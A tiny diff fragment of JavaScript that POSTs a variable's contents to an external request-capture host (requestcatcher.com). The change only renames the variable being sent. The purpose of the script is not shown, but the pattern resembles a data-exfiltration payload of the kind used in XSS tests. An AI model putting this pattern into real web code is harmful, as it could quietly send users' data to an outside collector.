@@ -10,4 +10,5 @@ const xhr = new XMLHttpRequest();
 xhr.open("POST", "https://lemon.requestcatcher.com/", true);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-xhr.send(v);
+let data = v;
+xhr.send(data);
